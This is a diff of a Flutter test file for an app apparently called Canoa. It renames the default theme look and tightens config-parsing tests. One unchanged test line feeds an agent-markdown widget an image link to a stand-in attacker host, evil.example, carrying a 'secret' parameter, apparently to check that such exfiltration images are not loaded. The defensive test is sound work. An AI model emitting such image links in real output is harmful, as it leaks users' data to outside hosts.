@@ -326,7 +326,7 @@ void main() {
         return null;
       });
       await tester.pumpWidget(MaterialApp(
-        theme: themeFor(LookId.bubbles, Brightness.dark),
+        theme: themeFor(LookId.canoa, Brightness.dark),
         home: const Scaffold(body: AgentMarkdown(text: '![the secret](https://evil.example/?d=secret) [a link](https://example.org/x)')),
       ));
       await tester.pump();
@@ -454,9 +454,11 @@ void main() {
       final read = CanoaConfig.parse(chosen.encode());
       expect(read.look, LookId.terminal);
       expect(read.themeMode, ThemeMode.light);
-      expect(const CanoaConfig().look, LookId.bubbles, reason: 'a file from before looks did not exist reads as it did');
-      expect(CanoaConfig.parse('[desktop]\nstart_hidden = true\n').look, LookId.bubbles);
-      expect(() => CanoaConfig.parse('[appearance]\nlook = "neon"\n'), throwsFormatException);
+      expect(const CanoaConfig().look, LookId.canoa, reason: 'a file from before looks did not exist reads as it did');
+      expect(CanoaConfig.parse('[desktop]\nstart_hidden = true\n').look, LookId.canoa);
+      for (final unknown in ['neon', 'bubbles', 'document']) {
+        expect(() => CanoaConfig.parse('[appearance]\nlook = "$unknown"\n'), throwsFormatException);
+      }
       expect(() => CanoaConfig.parse('[appearance]\nbrightness = "dim"\n'), throwsFormatException);
       expect(() => CanoaConfig.parse('[appearance]\nsomething = 1\n'), throwsFormatException);
     });
@@ -474,7 +476,7 @@ void main() {
       ))));
       await tester.tap(find.text('open'));
       await tester.pumpAndSettle();
-      await tester.tap(find.text('Bubbles'));
+      await tester.tap(find.text('Canoa'));
       await tester.pumpAndSettle();
       await tester.tap(find.text('Terminal').last);
       await tester.pumpAndSettle();
